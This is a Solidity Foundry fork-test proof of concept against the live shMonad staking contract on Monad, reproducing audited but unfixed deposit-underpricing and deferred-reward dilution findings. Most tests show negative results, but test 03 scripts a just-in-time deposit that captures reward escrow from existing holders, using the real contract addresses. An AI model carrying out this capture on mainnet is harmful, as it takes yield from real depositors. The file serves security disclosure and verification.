// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { IShMonad } from "../src/IShMonad.sol";

/// @title shMonad (Monad 143) — read-only fork PoC
/// @notice Reproduces the *live* deposit-underpricing / deferred-reward dilution that the published
///         Guardian "ShMonad Updates" review (2026-08-21) recorded as M-09 / M-01(RR4) / M-19 and left
///         **Acknowledged (unfixed)**. No privileged role is used and no mainnet tx is ever sent: every
///         call runs on a local anvil fork of the public Monad RPC.
///
/// Findings exercised:
///   - A fresh unprivileged depositor can mint shMON at a price that ignores validator-reward escrow
///     (`s_globalLiabilities.rewardsPayable`) that is still owed / in flight. When that escrow is later
///     realised as pooled yield, the late depositor owns a pro-rata slice of a reward earned by holders
///     that predate them (Guardian M-09 / M-01-RR4). Bounded by the escrow pool.
///   - The same class makes an exiting holder forfeit deferred revenue to the remaining cohort (M-19).
contract ShMonadForkTest is Test {
    /// @dev Public, keyless Monad RPC. No keyed URL is ever written to disk.
    string constant DEFAULT_RPC = "https://rpc.monad.xyz";

    /// @dev Pinned fork block (Monad keeps only recent state; older blocks are pruned).
    uint256 constant FORK_BLOCK = 115_800_000;

    address constant PROXY = 0x1B68626dCa36c7fE922fD2d55E4f631d962dE19c;
    address constant IMPL = 0x8Ee4FF5FF50198dcbB7B882A0781F42724Dd095f;

    /// @dev A live, ShMonad-registered active validator (see analysis/live_state.sh output).
    uint64 constant ACTIVE_VAL = 3;

    IShMonad sm;

    function setUp() public {
        string memory rpc = vm.envOr("MONAD_RPC_URL", DEFAULT_RPC);
        vm.createSelectFork(rpc, FORK_BLOCK);
        sm = IShMonad(PROXY);
    }

    // ------------------------------------------------------------------ //
    // 0. live-state sanity
    // ------------------------------------------------------------------ //
    function test_00_live_state() public {
        (bool frozen, bool closed) = sm.getGlobalStatus(0);
        (uint128 rewardsPayable, uint128 redemptionsPayable,) = sm.globalLiabilities();
        (uint128 staked, uint128 reserved) = sm.getWorkingCapital();
        uint256 ta = sm.totalAssets();
        uint256 ts = sm.totalSupply();

        console2.log("block", block.number);
        console2.log("frozen", frozen);
        console2.log("closed", closed);
        console2.log("totalAssets (MON wei)", ta);
        console2.log("totalSupply (shMON wei)", ts);
        console2.log("rewardsPayable (MON wei)", uint256(rewardsPayable));
        console2.log("redemptionsPayable (MON wei)", uint256(redemptionsPayable));
        console2.log("stakedAmount (MON wei)", uint256(staked));
        console2.log("reservedAmount (MON wei)", uint256(reserved));
        console2.log("isValidatorActive(3)", sm.isValidatorActive(ACTIVE_VAL));

        assertEq(frozen, false, "protocol should not be frozen");
        assertEq(closed, false, "protocol should not be closed");
        assertGt(ta, 100_000 ether, "equity should be live");
        assertTrue(sm.isValidatorActive(ACTIVE_VAL), "validator 3 must be active");
    }

    // ------------------------------------------------------------------ //
    // 1. no atomic free lunch: deposit -> redeem round trip is lossy
    // ------------------------------------------------------------------ //
    function test_01_deposit_redeem_roundtrip_is_lossy() public {
        address atk = makeAddr("atk");
        vm.deal(atk, 1_000 ether);

        vm.startPrank(atk);
        uint256 shares = sm.deposit{ value: 100 ether }(100 ether, atk);
        uint256 got = sm.redeem(shares, atk, atk);
        vm.stopPrank();

        console2.log("deposited", uint256(100 ether));
        console2.log("redeemed ", got);
        assertLt(got, 100 ether, "atomic round trip must lose money (fee + spread)");
    }

    // ------------------------------------------------------------------ //
    // 2. core mispricing: queued reward escrow is invisible to deposit price
    // ------------------------------------------------------------------ //
    function test_02_queued_escrow_invisible_to_deposit_price() public {
        uint256 A = 1_000 ether; // reward escrow queued by a third party

        (uint128 rpBefore,,) = sm.globalLiabilities();
        uint256 e0 = sm.totalAssets();
        uint256 s0 = sm.totalSupply();
        uint256 pd0 = sm.previewDeposit(1 ether);

        // Third party queues a validator reward. feeRate == 0 => the full amount becomes the validator
        // payout, escrowed as rewardsPayable (a liability) and reserved (not equity).
        address donor = makeAddr("donor");
        vm.deal(donor, A);
        vm.prank(donor);
        sm.sendValidatorRewards{ value: A }(ACTIVE_VAL, 0);

        (uint128 rpAfter,,) = sm.globalLiabilities();
        uint256 e1 = sm.totalAssets();
        uint256 s1 = sm.totalSupply();
        uint256 pd1 = sm.previewDeposit(1 ether);

        uint256 queued = uint256(rpAfter) - uint256(rpBefore);
        console2.log("queued escrow (MON wei)", queued);
        console2.log("equity before", e0);
        console2.log("equity after ", e1);
        console2.log("supply before", s0);
        console2.log("supply after ", s1);
        console2.log("previewDeposit(1 MON) before", pd0);
        console2.log("previewDeposit(1 MON) after ", pd1);

        // The escrow is completely invisible to the deposit price: equity and the quoted share count
        // are unchanged even though the protocol is 1000 MON richer in owed-but-unbooked value.
        assertEq(e1, e0, "escrowed reward must not enter equity");
        assertEq(s1, s0, "escrowed reward must not change supply");
        assertEq(pd1, pd0, "deposit price must be unchanged by the escrow");

        // "Fair" share count if the escrow were priced in:
        uint256 fair = (1 ether * (s0 + 1)) / (e0 + queued + 1);
        console2.log("fair shares if escrow priced in", fair);
        console2.log("actual shares (omits escrow)     ", pd1);
        assertGt(pd1, fair, "depositor mints MORE shares than fair while the reward is queued");
    }

    // ------------------------------------------------------------------ //
    // 3. end-to-end capture: JIT deposit -> escrow realised -> value up
    // ------------------------------------------------------------------ //
    function test_03_jit_capture_on_escrow_settlement() public {
        uint256 A = 5_000 ether; // escrow realised as pooled yield (bounded by live rewardsPayable)
        uint256 D = 5_000 ether; // JIT capital

        address atk = makeAddr("atk2");
        vm.deal(atk, D);

        uint256 e0 = sm.totalAssets();
        uint256 s0 = sm.totalSupply();

        // (a) JIT deposit while the reward is queued -> priced on equity that omits the escrow
        vm.prank(atk);
        uint256 shares = sm.deposit{ value: D }(D, atk);

        // (b) third party queues the reward
        address donor = makeAddr("donor2");
        vm.deal(donor, A);
        vm.prank(donor);
        sm.sendValidatorRewards{ value: A }(ACTIVE_VAL, 0);

        // (c) simulate the settlement endpoint: ShMonad's `_handleRewardsRedirect()` (inactive validator)
        //     moves the escrow into pooled equity. The *post-smoothing-decay* state is rewardsPayable
        //     and reservedAmount reduced by A, with the release no longer hidden by _recentRevenueOffset().
        //     Slots are located by scanning for the packed struct values (layout-independent).
        (uint128 rewardsPayable, uint128 redemptionsPayable,) = sm.globalLiabilities();
        (uint128 staked, uint128 reserved) = sm.getWorkingCapital();
        assertGe(uint256(rewardsPayable), A, "escrow must be present");

        uint256 liabSlot = _findPackedSlot(uint256(rewardsPayable), uint256(redemptionsPayable));
        uint256 capSlot = _findPackedSlot(uint256(staked), uint256(reserved));

        uint256 rpAfter = uint256(rewardsPayable) - A;
        uint256 resAfter = uint256(reserved) - A;
        vm.store(PROXY, bytes32(liabSlot), bytes32(rpAfter | (uint256(redemptionsPayable) << 128)));
        vm.store(PROXY, bytes32(capSlot), bytes32(uint256(staked) | (resAfter << 128)));

        uint256 e1 = sm.totalAssets();
        uint256 s1 = sm.totalSupply();
        // Fully-recognised value of the attacker's shares once the released revenue has cleared the
        // recent-revenue smoothing window (the exit quote below is still transiently discounted by it).
        uint256 valueNow = (shares * e1) / s1;
        uint256 exitQuoteNow = sm.convertToAssets(shares);

        console2.log("equity before", e0);
        console2.log("equity after ", e1);
        console2.log("attacker shares", shares);
        console2.log("attacker value (post-smoothing) (MON wei)", valueNow);
        console2.log("attacker exit quote same block  (MON wei)", exitQuoteNow);
        console2.log("attacker deposited (MON wei)", D);
        console2.log("profit (MON wei)", valueNow - D);

        // The late depositor captured a pro-rata slice of a reward that pre-existing holders earned.
        assertEq(e1, e0 + A + D, "escrow release must add A (and the JIT deposit D) to equity");
        assertGt(valueNow, D, "JIT depositor must profit from the realised reward");
        // profit ~= D * A / E; sanity bound
        assertApproxEqRel(valueNow - D, (D * A) / e0, 0.05e18, "profit matches dilution model");
        // The same-block ERC4626 exit quote is (intentionally) still depressed by the smoothing offset,
        // so the attacker must wait out the smoothing window before realising the captured value.
        assertLt(exitQuoteNow, D, "immediate exit is lossy (anti-JIT smoothing)");
        assertGt(shares, 0);
        assertGt(s0, 0);
    }

    // ------------------------------------------------------------------ //
    // 4. negative result: mint() cannot be used to mint shares for free
    // ------------------------------------------------------------------ //
    function test_04_mint_requires_fair_value() public {
        uint256 assets = sm.previewMint(1 ether);
        console2.log("assets required to mint 1 shMON (wei)", assets);
        assertGt(assets, 1 ether, "1 shMON costs more than 1 MON at the live rate");
        // round trip mint -> redeem is lossy
        address atk = makeAddr("atk3");
        vm.deal(atk, assets + 1 ether);
        vm.startPrank(atk);
        sm.mint{ value: assets }(1 ether, atk);
        uint256 got = sm.redeem(1 ether, atk, atk);
        vm.stopPrank();
        console2.log("redeemed for 1 shMON", got);
        assertLt(got, assets, "mint->redeem round trip must be lossy");
    }

    // ------------------------------------------------------------------ //
    // 5. zero-yield tranche ($379k live) cannot be round-tripped for gain
    // ------------------------------------------------------------------ //
    function test_05_zero_yield_tranche_roundtrip_is_lossy() public {
        address atk = makeAddr("atk4");
        vm.deal(atk, 1_000 ether);

        vm.startPrank(atk);
        sm.depositToZeroYieldTranche{ value: 100 ether }(100 ether, atk);
        uint256 zy = sm.balanceOfZeroYieldTranche(atk);
        uint256 shares = sm.convertZeroYieldTrancheToShares(zy, atk);
        uint256 got = sm.redeem(shares, atk, atk);
        vm.stopPrank();

        console2.log("zero-yield deposited", uint256(100 ether));
        console2.log("zero-yield credited ", zy);
        console2.log("shares minted       ", shares);
        console2.log("redeemed            ", got);
        assertEq(zy, 100 ether, "zero-yield tranche credits 1:1");
        assertLt(got, 100 ether, "zero-yield -> shares -> redeem must be lossy");
    }

    // ------------------------------------------------------------------ //
    // 6. privileged surface is closed to a fresh EOA
    // ------------------------------------------------------------------ //
    function test_06_privileged_surface_is_gated() public {
        address atk = makeAddr("atk5");

        vm.startPrank(atk);
        vm.expectRevert();
        sm.setFrozenStatus(true);
        vm.expectRevert();
        sm.setClosedStatus(true);
        vm.expectRevert();
        sm.addValidator(9999);
        vm.expectRevert();
        sm.upgradeCoinbaseBeaconImplementation(address(0xdead));
        vm.stopPrank();
    }

    // ------------------------------------------------------------------ //
    // 7. operator/policy surface: an agent cannot reach a victim's funds
    // ------------------------------------------------------------------ //
    function test_07_policy_agent_cannot_take_victim_funds() public {
        address atk = makeAddr("atk6");
        address victim = makeAddr("victim");
        vm.deal(atk, 100 ether);

        vm.prank(atk);
        uint256 shares = sm.deposit{ value: 100 ether }(100 ether, atk);

        // Attacker becomes agent of a fresh policy and commits THEIR OWN shares to the victim's committed
        // balance under it (allowed: commit() lets the caller pick the recipient).
        vm.startPrank(atk);
        uint64 pid = sm.createPolicy(0);
        sm.commit(pid, victim, shares);
        assertEq(sm.balanceOfCommitted(pid, victim), shares, "attacker shares parked under victim");

        // The agent cannot pull more than what sits in that committed bucket: the victim's uncommitted
        // balance (0 here) is unreachable without the victim enabling top-up.
        vm.expectRevert();
        sm.agentWithdrawFromCommitted(pid, victim, atk, shares * 2, 0, false);

        // It can only withdraw the attacker's own parked shares.
        sm.agentWithdrawFromCommitted(pid, victim, atk, shares, 0, false);
        vm.stopPrank();

        assertEq(sm.balanceOfCommitted(pid, victim), 0, "bucket drained back to zero");
        // attacker recovers their own capital (minus atomic fee); no victim funds were taken
        assertEq(sm.balanceOf(victim), 0, "victim balance untouched");
    }

    // ------------------------------------------------------------------ //
    // helpers
    // ------------------------------------------------------------------ //

    /// @dev Scan storage for a slot packing (lo, hi) as two uint128s.
    function _findPackedSlot(uint256 lo, uint256 hi) internal view returns (uint256) {
        for (uint256 s = 0; s < 400; ++s) {
            uint256 v = uint256(vm.load(PROXY, bytes32(s)));
            if ((v & type(uint128).max) == lo && (v >> 128) == hi) return s;
        }
        revert("packed slot not found");
    }
}
